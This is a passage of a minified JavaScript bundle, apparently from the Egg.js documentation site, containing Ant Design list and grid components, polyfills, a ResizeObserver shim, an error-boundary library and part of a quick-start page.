a["createElement"](te["a"],null,v)},mn=function(e){var t=e.prefixCls,n=a["useContext"](te["b"]),r=n.getPrefixCls,l=r("spin",t),o=Object(Q["a"])(Object(Q["a"])({},e),{spinPrefixCls:l});return a["createElement"](dn,Object(Q["a"])({},o))};mn.setDefaultIndicator=function(e){cn=e};var pn=mn,hn=function(e,t){var n={};for(var a in e)Object.prototype.hasOwnProperty.call(e,a)&&t.indexOf(a)<0&&(n[a]=e[a]);if(null!=e&&"function"===typeof Object.getOwnPropertySymbols){var r=0;for(a=Object.getOwnPropertySymbols(e);r<a.length;r++)t.indexOf(a[r])<0&&Object.prototype.propertyIsEnumerable.call(e,a[r])&&(n[a[r]]=e[a[r]])}return n};function gn(e){return"number"===typeof e?"".concat(e," ").concat(e," auto"):/^\d+(\.\d+)?(px|em|rem|%)$/.test(e)?"0 0 ".concat(e):e}var fn=["xs","sm","md","lg","xl","xxl"],En=a["forwardRef"]((function(e,t){var n,r=a["useContext"](te["b"]),l=r.getPrefixCls,o=r.direction,i=a["useContext"](Le),c=i.gutter,s=i.wrap,u=i.supportFlexGap,d=e.prefixCls,m=e.span,p=e.order,h=e.offset,g=e.push,f=e.pull,E=e.className,b=e.children,v=e.flex,y=e.style,k=hn(e,["prefixCls","span","order","offset","push","pull","className","children","flex","style"]),w=l("col",d),x={};fn.forEach((function(t){var n,a={},r=e[t];"number"===typeof r?a.span=r:"object"===Object(Y["a"])(r)&&(a=r||{}),delete k[t],x=Object(Q["a"])(Object(Q["a"])({},x),(n={},Object(K["a"])(n,"".concat(w,"-").concat(t,"-").concat(a.span),void 0!==a.span),Object(K["a"])(n,"".concat(w,"-").concat(t,"-order-").concat(a.order),a.order||0===a.order),Object(K["a"])(n,"".concat(w,"-").concat(t,"-offset-").concat(a.offset),a.offset||0===a.offset),Object(K["a"])(n,"".concat(w,"-").concat(t,"-push-").concat(a.push),a.push||0===a.push),Object(K["a"])(n,"".concat(w,"-").concat(t,"-pull-").concat(a.pull),a.pull||0===a.pull),Object(K["a"])(n,"".concat(w,"-rtl"),"rtl"===o),n))}));var j=ee()(w,(n={},Object(K["a"])(n,"".concat(w,"-").concat(m),void 0!==m),Object(K["a"])(n,"".concat(w,"-order-").concat(p),p),Object(K["a"])(n,"".concat(w,"-offset-").concat(h),h),Object(K["a"])(n,"".concat(w,"-push-").concat(g),g),Object(K["a"])(n,"".concat(w,"-pull-").concat(f),f),n),E,x),S={};if(c&&c[0]>0){var C=c[0]/2;S.paddingLeft=C,S.paddingRight=C}if(c&&c[1]>0&&!u){var A=c[1]/2;S.paddingTop=A,S.paddingBottom=A}return v&&(S.flex=gn(v),!1!==s||S.minWidth||(S.minWidth=0)),a["createElement"]("div",Object(Q["a"])({},k,{style:Object(Q["a"])(Object(Q["a"])({},S),y),className:j,ref:t}),b)}));var bn=En,vn=function(e,t){var n={};for(var a in e)Object.prototype.hasOwnProperty.call(e,a)&&t.indexOf(a)<0&&(n[a]=e[a]);if(null!=e&&"function"===typeof Object.getOwnPropertySymbols){var r=0;for(a=Object.getOwnPropertySymbols(e);r<a.length;r++)t.indexOf(a[r])<0&&Object.prototype.propertyIsEnumerable.call(e,a[r])&&(n[a[r]]=e[a[r]])}return n},yn=function(e){var t=e.prefixCls,n=e.className,l=e.avatar,o=e.title,i=e.description,c=vn(e,["prefixCls","className","avatar","title","description"]),s=Object(a["useContext"])(te["b"]),u=s.getPrefixCls,d=u("list",t),m=ee()("".concat(d,"-item-meta"),n),p=r.a.createElement("div",{className:"".concat(d,"-item-meta-content")},o&&r.a.createElement("h4",{className:"".concat(d,"-item-meta-title")},o),i&&r.a.createElement("div",{className:"".concat(d,"-item-meta-description")},i));return r.a.createElement("div",Object(Q["a"])({},c,{className:m}),l&&r.a.createElement("div",{className:"".concat(d,"-item-meta-avatar")},l),(o||i)&&p)},kn=function(e,t){var n=e.prefixCls,l=e.children,o=e.actions,i=e.extra,c=e.className,s=e.colStyle,u=vn(e,["prefixCls","children","actions","extra","className","colStyle"]),d=Object(a["useContext"])(Sn),m=d.grid,p=d.itemLayout,h=Object(a["useContext"])(te["b"]),g=h.getPrefixCls,f=function(){var e;return a["Children"].forEach(l,(function(t){"string"===typeof t&&(e=!0)})),e&&a["Children"].count(l)>1},E=function(){return"vertical"===p?!!i:!f()},b=g("list",n),v=o&&o.length>0&&r.a.createElement("ul",{className:"".concat(b,"-item-action"),key:"actions"},o.map((function(e,t){return r.a.createElement("li",{key:"".concat(b,"-item-action-").concat(t)},e,t!==o.length-1&&r.a.createElement("em",{className:"".concat(b,"-item-action-split")}))}))),y=m?"div":"li",k=r.a.createElement(y,Object(Q["a"])({},u,m?{}:{ref:t},{className:ee()("".concat(b,"-item"),Object(K["a"])({},"".concat(b,"-item-no-flex"),!E()),c)}),"vertical"===p&&i?[r.a.createElement("div",{className:"".concat(b,"-item-main"),key:"content"},l,v),r.a.createElement("div",{className:"".concat(b,"-item-extra"),key:"extra"},i)]:[l,v,ln(i,{key:"extra"})]);return m?r.a.createElement(bn,{ref:t,flex:1,style:s},k):k},wn=Object(a["forwardRef"])(kn);wn.Meta=yn;var xn=wn,jn=function(e,t){var n={};for(var a in e)Object.prototype.hasOwnProperty.call(e,a)&&t.indexOf(a)<0&&(n[a]=e[a]);if(null!=e&&"function"===typeof Object.getOwnPropertySymbols){var r=0;for(a=Object.getOwnPropertySymbols(e);r<a.length;r++)t.indexOf(a[r])<0&&Object.prototype.propertyIsEnumerable.call(e,a[r])&&(n[a[r]]=e[a[r]])}return n},Sn=a["createContext"]({});Sn.Consumer;function Cn(e){var t,n=e.pagination,r=void 0!==n&&n,l=e.prefixCls,o=e.bordered,i=void 0!==o&&o,c=e.split,s=void 0===c||c,u=e.className,d=e.children,m=e.itemLayout,p=e.loadMore,h=e.grid,g=e.dataSource,f=void 0===g?[]:g,E=e.size,b=e.header,v=e.footer,y=e.loading,k=void 0!==y&&y,w=e.rowKey,x=e.renderItem,j=e.locale,S=jn(e,["pagination","prefixCls","bordered","split","className","children","itemLayout","loadMore","grid","dataSource","size","header","footer","loading","rowKey","renderItem","locale"]),C=r&&"object"===Object(Y["a"])(r)?r:{},A=a["useState"](C.defaultCurrent||1),L=Object(J["a"])(A,2),T=L[0],N=L[1],O=a["useState"](C.defaultPageSize||10),I=Object(J["a"])(O,2),P=I[0],R=I[1],_=a["useContext"](te["b"]),q=_.getPrefixCls,M=_.renderEmpty,F=_.direction,D={current:1,total:0},U=function(e){return function(t,n){N(t),R(n),r&&r[e]&&r[e](t,n)}},z=U("onChange"),H=U("onShowSizeChange"),B=function(e,t){return x?(n="function"===typeof w?w(e):w?e[w]:e.key,n||(n="list-item-".concat(t)),a["createElement"](a["Fragment"],{key:n},x(e,t))):null;var n},W=function(){return!!(p||r||v)},V=function(e,t){return a["createElement"]("div",{className:"".concat(e,"-empty-text")},j&&j.emptyText||t("List"))},$=q("list",l),G=k;"boolean"===typeof G&&(G={spinning:G});var Z=G&&G.spinning,ne="";switch(E){case"large":ne="lg";break;case"small":ne="sm";break;default:break}var ae=ee()($,(t={},Object(K["a"])(t,"".concat($,"-vertical"),"vertical"===m),Object(K["a"])(t,"".concat($,"-").concat(ne),ne),Object(K["a"])(t,"".concat($,"-split"),s),Object(K["a"])(t,"".concat($,"-bordered"),i),Object(K["a"])(t,"".concat($,"-loading"),Z),Object(K["a"])(t,"".concat($,"-grid"),!!h),Object(K["a"])(t,"".concat($,"-something-after-last-item"),W()),Object(K["a"])(t,"".concat($,"-rtl"),"rtl"===F),t),u),re=Object(Q["a"])(Object(Q["a"])(Object(Q["a"])({},D),{total:f.length,current:T,pageSize:P}),r||{}),le=Math.ceil(re.total/re.pageSize);re.current>le&&(re.current=le);var oe=r?a["createElement"]("div",{className:"".concat($,"-pagination")},a["createElement"](en,Object(Q["a"])({},re,{onChange:z,onShowSizeChange:H}))):null,ie=Object(X["a"])(f);r&&f.length>(re.current-1)*re.pageSize&&(ie=Object(X["a"])(f).splice((re.current-1)*re.pageSize,re.pageSize));var ce=Object.keys(h||{}).some((function(e){return["xs","sm","md","lg","xl","xxl"].includes(e)})),se=_e(ce),ue=a["useMemo"]((function(){for(var e=0;e<ve.length;e+=1){var t=ve[e];if(se[t])return t}}),[se]),de=a["useMemo"]((function(){if(h){var e=ue&&h[ue]?h[ue]:h.column;return e?{width:"".concat(100/e,"%"),maxWidth:"".concat(100/e,"%")}:void 0}}),[null===h||void 0===h?void 0:h.column,ue]),me=Z&&a["createElement"]("div",{style:{minHeight:53}});if(ie.length>0){var pe=ie.map((function(e,t){return B(e,t)}));me=h?a["createElement"](Ie,{gutter:h.gutter},a["Children"].map(pe,(function(e){return a["createElement"]("div",{key:null===e||void 0===e?void 0:e.key,style:de},e)}))):a["createElement"]("ul",{className:"".concat($,"-items")},pe)}else d||Z||(me=V($,M||he));var ge=re.position||"bottom",fe=a["useMemo"]((function(){return{grid:h,itemLayout:m}}),[JSON.stringify(h),m]);return a["createElement"](Sn.Provider,{value:fe},a["createElement"]("div",Object(Q["a"])({className:ae},S),("top"===ge||"both"===ge)&&oe,b&&a["createElement"]("div",{className:"".concat($,"-header")},b),a["createElement"](pn,Object(Q["a"])({},G),me,d),v&&a["createElement"]("div",{className:"".concat($,"-footer")},v),p||("bottom"===ge||"both"===ge)&&oe))}Cn.Item=xn;var An=Cn,Ln=(n("e3ou"),function(e){var t=e.data;return r.a.createElement("div",{className:"__dumi-egg-links"},r.a.createElement("div",{className:"__dumi-egg-links-wrap"},t.map((function(e,t){var n=e.title,a=e.list;return a?r.a.createElement("div",{className:"__dumi-egg-links-item",key:"".concat(t)},r.a.createElement(An,{key:n,header:n,dataSource:a,bordered:!1,split:!1,renderItem:function(e){return e.qrcode?r.a.createElement(An.Item,null,r.a.createElement("img",{className:"__dumi-egg-links-qrcode",src:e.qrcode})):r.a.createElement(An.Item,null,r.a.createElement("a",{href:e.url,target:"_blank"},e.name))}})):null}))))}),Tn=Ln,Nn=function(e){var t=e.data;return r.a.createElement("div",{className:"__dumi-egg-features"},r.a.createElement("div",{className:"__dumi-egg-features-wrap"},t.map((function(e,t){return r.a.createElement("div",{className:"__dumi-egg-features-item",key:"".concat(t)},r.a.createElement("div",{className:"__dumi-egg-features-item-icon"},r.a.createElement("img",{src:e.icon})),r.a.createElement("h2",null,e.title),r.a.createElement("p",null,e.desc))}))))},On=Nn,In=function(e){var t=e.site;return r.a.createElement("div",{className:"__dumi-egg-copyright"},"Copyright \xa9 ",(new Date).getFullYear()," ",t)},Pn=In;n("dG76");function Rn(e){return Rn="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e},Rn(e)}var _n=["children"];function qn(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function Mn(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?qn(Object(n),!0).forEach((function(t){Fn(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):qn(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function Fn(e,t,n){return t=Dn(t),t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function Dn(e){var t=Un(e,"string");return"symbol"===Rn(t)?t:String(t)}function Un(e,t){if("object"!==Rn(e)||null===e)return e;var n=e[Symbol.toPrimitive];if(void 0!==n){var a=n.call(e,t||"default");if("object"!==Rn(a))return a;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===t?String:Number)(e)}function zn(e,t){if(null==e)return{};var n,a,r=Hn(e,t);if(Object.getOwnPropertySymbols){var l=Object.getOwnPropertySymbols(e);for(a=0;a<l.length;a++)n=l[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}function Hn(e,t){if(null==e)return{};var n,a,r={},l=Object.keys(e);for(a=0;a<l.length;a++)n=l[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}var Bn=function(e){var t=e.children,n=zn(e,_n),o=Object(a["useContext"])(l["context"]),i=o.meta,c=o.config.theme,s=i.title,u=i.egg,d=function(){return r.a.createElement(r.a.Fragment,null,r.a.createElement(G,{data:u}),r.a.createElement(On,{data:u.features}),r.a.createElement(Tn,{data:c.links}),r.a.createElement(Pn,{site:"Eggjs.org"}))},m=function(){return r.a.createElement("div",{className:"__dumi-egg-title"},r.a.createElement("h1",null,s))};return u?r.a.createElement(V,Mn({},n),d()):r.a.createElement(V,Mn({},n),m(),t)};t["default"]=Bn},dxz4:function(e,t,n){"use strict";var a=n("0mt+"),r=n("A0UU"),l=n("ALk6"),o=n("AzF/"),i=n("x9/w"),c=n("NBU9"),s=n("k8mt"),u=n("a7jj"),d=n("Xdqv"),m=n("o9Ln"),p=n("oi/H"),h=n("Fndp");e.exports=function(e,t,n){var g=-1!==e.indexOf("Map"),f=-1!==e.indexOf("Weak"),E=g?"set":"add",b=r[e],v=b&&b.prototype,y=b,k={},w=function(e){var t=v[e];o(v,e,"add"==e?function(e){return t.call(this,0===e?0:e),this}:"delete"==e?function(e){return!(f&&!u(e))&&t.call(this,0===e?0:e)}:"get"==e?function(e){return f&&!u(e)?void 0:t.call(this,0===e?0:e)}:"has"==e?function(e){return!(f&&!u(e))&&t.call(this,0===e?0:e)}:function(e,n){return t.call(this,0===e?0:e,n),this})};if(l(e,"function"!=typeof b||!(f||v.forEach&&!d((function(){(new b).entries().next()})))))y=n.getConstructor(t,e,g,E),i.REQUIRED=!0;else if(l(e,!0)){var x=new y,j=x[E](f?{}:-0,1)!=x,S=d((function(){x.has(1)})),C=m((function(e){new b(e)})),A=!f&&d((function(){var e=new b,t=5;while(t--)e[E](t,t);return!e.has(-0)}));C||(y=t((function(t,n){s(t,y,e);var a=h(new b,t,y);return void 0!=n&&c(n,a[E],a,g),a})),y.prototype=v,v.constructor=y),(S||A)&&(w("delete"),w("has"),g&&w("get")),(A||j)&&w(E),f&&v.clear&&delete v.clear}return k[e]=y,a({global:!0,forced:y!=b},k),p(y,e),f||n.setStrong(y,e,g),y}},"dzO+":function(e,t,n){"use strict";(function(e){var n=function(){if("undefined"!==typeof Map)return Map;function e(e,t){var n=-1;return e.some((function(e,a){return e[0]===t&&(n=a,!0)})),n}return function(){function t(){this.__entries__=[]}return Object.defineProperty(t.prototype,"size",{get:function(){return this.__entries__.length},enumerable:!0,configurable:!0}),t.prototype.get=function(t){var n=e(this.__entries__,t),a=this.__entries__[n];return a&&a[1]},t.prototype.set=function(t,n){var a=e(this.__entries__,t);~a?this.__entries__[a][1]=n:this.__entries__.push([t,n])},t.prototype["delete"]=function(t){var n=this.__entries__,a=e(n,t);~a&&n.splice(a,1)},t.prototype.has=function(t){return!!~e(this.__entries__,t)},t.prototype.clear=function(){this.__entries__.splice(0)},t.prototype.forEach=function(e,t){void 0===t&&(t=null);for(var n=0,a=this.__entries__;n<a.length;n++){var r=a[n];e.call(t,r[1],r[0])}},t}()}(),a="undefined"!==typeof window&&"undefined"!==typeof document&&window.document===document,r=function(){return"undefined"!==typeof e&&e.Math===Math?e:"undefined"!==typeof self&&self.Math===Math?self:"undefined"!==typeof window&&window.Math===Math?window:Function("return this")()}(),l=function(){return"function"===typeof requestAnimationFrame?requestAnimationFrame.bind(r):function(e){return setTimeout((function(){return e(Date.now())}),1e3/60)}}(),o=2;function i(e,t){var n=!1,a=!1,r=0;function i(){n&&(n=!1,e()),a&&s()}function c(){l(i)}function s(){var e=Date.now();if(n){if(e-r<o)return;a=!0}else n=!0,a=!1,setTimeout(c,t);r=e}return s}var c=20,s=["top","right","bottom","left","width","height","size","weight"],u="undefined"!==typeof MutationObserver,d=function(){function e(){this.connected_=!1,this.mutationEventsAdded_=!1,this.mutationsObserver_=null,this.observers_=[],this.onTransitionEnd_=this.onTransitionEnd_.bind(this),this.refresh=i(this.refresh.bind(this),c)}return e.prototype.addObserver=function(e){~this.observers_.indexOf(e)||this.observers_.push(e),this.connected_||this.connect_()},e.prototype.removeObserver=function(e){var t=this.observers_,n=t.indexOf(e);~n&&t.splice(n,1),!t.length&&this.connected_&&this.disconnect_()},e.prototype.refresh=function(){var e=this.updateObservers_();e&&this.refresh()},e.prototype.updateObservers_=function(){var e=this.observers_.filter((function(e){return e.gatherActive(),e.hasActive()}));return e.forEach((function(e){return e.broadcastActive()})),e.length>0},e.prototype.connect_=function(){a&&!this.connected_&&(document.addEventListener("transitionend",this.onTransitionEnd_),window.addEventListener("resize",this.refresh),u?(this.mutationsObserver_=new MutationObserver(this.refresh),this.mutationsObserver_.observe(document,{attributes:!0,childList:!0,characterData:!0,subtree:!0})):(document.addEventListener("DOMSubtreeModified",this.refresh),this.mutationEventsAdded_=!0),this.connected_=!0)},e.prototype.disconnect_=function(){a&&this.connected_&&(document.removeEventListener("transitionend",this.onTransitionEnd_),window.removeEventListener("resize",this.refresh),this.mutationsObserver_&&this.mutationsObserver_.disconnect(),this.mutationEventsAdded_&&document.removeEventListener("DOMSubtreeModified",this.refresh),this.mutationsObserver_=null,this.mutationEventsAdded_=!1,this.connected_=!1)},e.prototype.onTransitionEnd_=function(e){var t=e.propertyName,n=void 0===t?"":t,a=s.some((function(e){return!!~n.indexOf(e)}));a&&this.refresh()},e.getInstance=function(){return this.instance_||(this.instance_=new e),this.instance_},e.instance_=null,e}(),m=function(e,t){for(var n=0,a=Object.keys(t);n<a.length;n++){var r=a[n];Object.defineProperty(e,r,{value:t[r],enumerable:!1,writable:!1,configurable:!0})}return e},p=function(e){var t=e&&e.ownerDocument&&e.ownerDocument.defaultView;return t||r},h=j(0,0,0,0);function g(e){return parseFloat(e)||0}function f(e){for(var t=[],n=1;n<arguments.length;n++)t[n-1]=arguments[n];return t.reduce((function(t,n){var a=e["border-"+n+"-width"];return t+g(a)}),0)}function E(e){for(var t=["top","right","bottom","left"],n={},a=0,r=t;a<r.length;a++){var l=r[a],o=e["padding-"+l];n[l]=g(o)}return n}function b(e){var t=e.getBBox();return j(0,0,t.width,t.height)}function v(e){var t=e.clientWidth,n=e.clientHeight;if(!t&&!n)return h;var a=p(e).getComputedStyle(e),r=E(a),l=r.left+r.right,o=r.top+r.bottom,i=g(a.width),c=g(a.height);if("border-box"===a.boxSizing&&(Math.round(i+l)!==t&&(i-=f(a,"left","right")+l),Math.round(c+o)!==n&&(c-=f(a,"top","bottom")+o)),!k(e)){var s=Math.round(i+l)-t,u=Math.round(c+o)-n;1!==Math.abs(s)&&(i-=s),1!==Math.abs(u)&&(c-=u)}return j(r.left,r.top,i,c)}var y=function(){return"undefined"!==typeof SVGGraphicsElement?function(e){return e instanceof p(e).SVGGraphicsElement}:function(e){return e instanceof p(e).SVGElement&&"function"===typeof e.getBBox}}();function k(e){return e===p(e).document.documentElement}function w(e){return a?y(e)?b(e):v(e):h}function x(e){var t=e.x,n=e.y,a=e.width,r=e.height,l="undefined"!==typeof DOMRectReadOnly?DOMRectReadOnly:Object,o=Object.create(l.prototype);return m(o,{x:t,y:n,width:a,height:r,top:n,right:t+a,bottom:r+n,left:t}),o}function j(e,t,n,a){return{x:e,y:t,width:n,height:a}}var S=function(){function e(e){this.broadcastWidth=0,this.broadcastHeight=0,this.contentRect_=j(0,0,0,0),this.target=e}return e.prototype.isActive=function(){var e=w(this.target);return this.contentRect_=e,e.width!==this.broadcastWidth||e.height!==this.broadcastHeight},e.prototype.broadcastRect=function(){var e=this.contentRect_;return this.broadcastWidth=e.width,this.broadcastHeight=e.height,e},e}(),C=function(){function e(e,t){var n=x(t);m(this,{target:e,contentRect:n})}return e}(),A=function(){function e(e,t,a){if(this.activeObservations_=[],this.observations_=new n,"function"!==typeof e)throw new TypeError("The callback provided as parameter 1 is not a function.");this.callback_=e,this.controller_=t,this.callbackCtx_=a}return e.prototype.observe=function(e){if(!arguments.length)throw new TypeError("1 argument required, but only 0 present.");if("undefined"!==typeof Element&&Element instanceof Object){if(!(e instanceof p(e).Element))throw new TypeError('parameter 1 is not of type "Element".');var t=this.observations_;t.has(e)||(t.set(e,new S(e)),this.controller_.addObserver(this),this.controller_.refresh())}},e.prototype.unobserve=function(e){if(!arguments.length)throw new TypeError("1 argument required, but only 0 present.");if("undefined"!==typeof Element&&Element instanceof Object){if(!(e instanceof p(e).Element))throw new TypeError('parameter 1 is not of type "Element".');var t=this.observations_;t.has(e)&&(t["delete"](e),t.size||this.controller_.removeObserver(this))}},e.prototype.disconnect=function(){this.clearActive(),this.observations_.clear(),this.controller_.removeObserver(this)},e.prototype.gatherActive=function(){var e=this;this.clearActive(),this.observations_.forEach((function(t){t.isActive()&&e.activeObservations_.push(t)}))},e.prototype.broadcastActive=function(){if(this.hasActive()){var e=this.callbackCtx_,t=this.activeObservations_.map((function(e){return new C(e.target,e.broadcastRect())}));this.callback_.call(e,t,e),this.clearActive()}},e.prototype.clearActive=function(){this.activeObservations_.splice(0)},e.prototype.hasActive=function(){return this.activeObservations_.length>0},e}(),L="undefined"!==typeof WeakMap?new WeakMap:new n,T=function(){function e(t){if(!(this instanceof e))throw new TypeError("Cannot call a class as a function.");if(!arguments.length)throw new TypeError("1 argument required, but only 0 present.");var n=d.getInstance(),a=new A(t,n,this);L.set(this,a)}return e}();["observe","unobserve","disconnect"].forEach((function(e){T.prototype[e]=function(){var t;return(t=L.get(this))[e].apply(t,arguments)}}));var N=function(){return"undefined"!==typeof r.ResizeObserver?r.ResizeObserver:T}();t["a"]=N}).call(this,n("CwJZ"))},dzlB:function(e,t,n){"use strict";n.d(t,"a",(function(){return r}));var a=n("310B"),r=new a["Plugin"]({validKeys:["modifyClientRenderOpts","patchRoutes","rootContainer","render","onRouteChange","__mfsu","getInitialState","initialStateConfig","request"]})},e3ou:function(e,t,n){},e5XM:function(e,t,n){"use strict";n.d(t,"a",(function(){return c}));var a=n("Gaq5"),r=n("FU0I"),l=n("KFTt"),o=n.n(l),i=n("PiIT");function c(e,t){var n=Object(r["useContext"])(i["a"]),l=Object(r["useRef"])(t);l.current=t;var c=Object(r["useState"])((()=>l.current?l.current(n.data[e]):n.data[e])),s=Object(a["a"])(c,2),u=s[0],d=s[1],m=Object(r["useRef"])(u);m.current=u;var p=Object(r["useRef"])(!1);return Object(r["useEffect"])((()=>(p.current=!0,()=>{p.current=!1})),[]),Object(r["useEffect"])((()=>{var a=a=>{if(p.current)if(t&&l.current){var r=l.current(a),i=m.current;o()(r,i)||d(r)}else d(a);else setTimeout((()=>{n.data[e]=a,n.update(e)}))};try{n.callbacks[e].add(a),n.update(e)}catch(r){n.callbacks[e]=new Set,n.callbacks[e].add(a),n.update(e)}return()=>{n.callbacks[e].delete(a)}}),[e]),u}},e9aW:function(e,t,n){var a=n("WM7W");a("toStringTag")},eIxH:function(e,t,n){var a=n("a7jj");e.exports=function(e){if(!a(e)&&null!==e)throw TypeError("Can't set "+String(e)+" as a prototype");return e}},eYjw:function(e,t,n){(function(e,a){a(t,n("FU0I"))})(0,(function(e,t){"use strict";function n(e){if(e&&e.__esModule)return e;var t=Object.create(null);return e&&Object.keys(e).forEach((function(n){if("default"!==n){var a=Object.getOwnPropertyDescriptor(e,n);Object.defineProperty(t,n,a.get?a:{enumerable:!0,get:function(){return e[n]}})}})),t["default"]=e,Object.freeze(t)}var a=n(t);function r(e,t){return r=Object.setPrototypeOf||function(e,t){return e.__proto__=t,e},r(e,t)}function l(e,t){e.prototype=Object.create(t.prototype),e.prototype.constructor=e,r(e,t)}var o=function(e,t){return void 0===e&&(e=[]),void 0===t&&(t=[]),e.length!==t.length||e.some((function(e,n){return!Object.is(e,t[n])}))},i={error:null},c=function(e){function t(){for(var t,n=arguments.length,a=new Array(n),r=0;r<n;r++)a[r]=arguments[r];return t=e.call.apply(e,[this].concat(a))||this,t.state=i,t.resetErrorBoundary=function(){for(var e,n=arguments.length,a=new Array(n),r=0;r<n;r++)a[r]=arguments[r];null==t.props.onReset||(e=t.props).onReset.apply(e,a),t.reset()},t}l(t,e),t.getDerivedStateFromError=function(e){return{error:e}};var n=t.prototype;return n.reset=function(){this.setState(i)},n.componentDidCatch=function(e,t){var n,a;null==(n=(a=this.props).onError)||n.call(a,e,t)},n.componentDidUpdate=function(e,t){var n,a,r=this.state.error,l=this.props.resetKeys;null!==r&&null!==t.error&&o(e.resetKeys,l)&&(null==(n=(a=this.props).onResetKeysChange)||n.call(a,e.resetKeys,l),this.reset())},n.render=function(){var e=this.state.error,t=this.props,n=t.fallbackRender,r=t.FallbackComponent,l=t.fallback;if(null!==e){var o={error:e,resetErrorBoundary:this.resetErrorBoundary};if(a.isValidElement(l))return l;if("function"===typeof n)return n(o);if(r)return a.createElement(r,o);throw new Error("react-error-boundary requires either a fallback, fallbackRender, or FallbackComponent prop")}return this.props.children},t}(a.Component);function s(e,t){var n=function(n){return a.createElement(c,t,a.createElement(e,n))},r=e.displayName||e.name||"Unknown";return n.displayName="withErrorBoundary("+r+")",n}function u(e){var t=a.useState(null),n=t[0],r=t[1];if(null!=e)throw e;if(null!=n)throw n;return r}e.ErrorBoundary=c,e.useErrorHandler=u,e.withErrorBoundary=s,Object.defineProperty(e,"__esModule",{value:!0})}))},"eap/":function(e,t,n){var a=n("AcHn"),r=n("TVTq").f,l={}.toString,o="object"==typeof window&&window&&Object.getOwnPropertyNames?Object.getOwnPropertyNames(window):[],i=function(e){try{return r(e)}catch(t){return o.slice()}};e.exports.f=function(e){return o&&"[object Window]"==l.call(e)?i(e):r(a(e))}},ekdb:function(e,t,n){var a=n("0mt+"),r=n("oyD1"),l=n("a7jj"),o=n("31yA"),i=n("Xdqv"),c=n("u3TI"),s=n("vr25"),u=n("Yftc"),d=n("aGbw");function m(e,t,n){var a,i,p=arguments.length<4?e:arguments[3],h=s.f(r(e),t);if(!h){if(l(i=u(e)))return m(i,t,n,p);h=d(0)}if(o(h,"value")){if(!1===h.writable||!l(p))return!1;if(a=s.f(p,t)){if(a.get||a.set||!1===a.writable)return!1;a.value=n,c.f(p,t,a)}else c.f(p,t,d(0,n));return!0}return void 0!==h.set&&(h.set.call(p,n),!0)}var p=i((function(){var e=c.f({},"a",{configurable:!0});return!1!==Reflect.set(u(e),"a",1,e)}));a({target:"Reflect",stat:!0,forced:p},{set:m})},estG:function(e,t,n){"use strict";var a=n("0mt+"),r=n("m4/z"),l=n("V3tB"),o=n("oyD1"),i=n("XaNN"),c=n("j9ts"),s=n("NBU9");a({target:"Set",proto:!0,real:!0,forced:r},{union:function(e){var t=o(this),n=new(c(t,l("Set")))(t);return s(e,i(n.add),n),n}})},ezrb:function(e,t,n){"use strict";n.d(t,"a",(function(){return c}));var a=n("0YMn"),r=n("t6MI"),l=n("paKd"),o=n("wx68");function i(e){return void 0!==e}function c(e,t){var n=t||{},c=n.defaultValue,s=n.value,u=n.onChange,d=n.postState,m=Object(o["a"])((function(){return i(s)?s:i(c)?"function"===typeof c?c():c:"function"===typeof e?e():e})),p=Object(a["a"])(m,2),h=p[0],g=p[1],f=void 0!==s?s:h,E=d?d(f):f,b=Object(r["a"])(u),v=Object(o["a"])([f]),y=Object(a["a"])(v,2),k=y[0],w=y[1];Object(l["b"])((function(){var e=k[0];h!==e&&b(h,e)}),[k]),Object(l["b"])((function(){i(s)||g(s)}),[s]);var x=Object(r["a"])((function(e,t){g(e,t),w([f],t)}));return[E,x]}},f3yK:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=n("3dEy"),c=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./intro/quickstart"},"Quick Start")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./intro/progressive"},"Progressive Development")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./tutorials/restful"},"RESTful API"))),r.a.createElement("h2",{id:"boilerplate-type-description"},r.a.createElement(l["AnchorLink"],{to:"#boilerplate-type-description","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Boilerplate Type Description"),r.a.createElement("p",null,"You can use boilerplate type like this:"),r.a.createElement(o["a"],{code:"$ npm init egg --type=simple",lang:"bash"}),r.a.createElement("h3",{id:"options"},r.a.createElement(l["AnchorLink"],{to:"#options","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Options"),r.a.createElement(i["a"],null,r.a.createElement("thead",null,r.a.createElement("tr",null,r.a.createElement("th",{align:"center"},"boilerplate type"),r.a.createElement("th",{align:"right"},"Description"))),r.a.createElement("tbody",null,r.a.createElement("tr",null,r.a.createElement("td",{align:"center"},"simple"),r.a.createElement("td",{align:"right"},"Simple egg app boilerplate")),r.a.createElement("tr",null,r.a.createElement("td",{align:"center"},"empty"),r.a.createElement("td",{align:"right"},"Empty egg app boilerplate")),r.a.createElement("tr",null,r.a.createElement("td",{align:"center"},"plugin"),r.a.createElement("td",{align:"right"},"egg plugin boilerplate")),r.a.createElement("tr",null,r.a.createElement("td",{align:"center"},"framework"),r.a.createElement("td",{align:"right"},"egg framework boilerplate")))),r.a.createElement("h2",{id:"template-engines"},r.a.createElement(l["AnchorLink"],{to:"#template-engines","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Template Engines"),r.a.createElement("p",null,"Build in 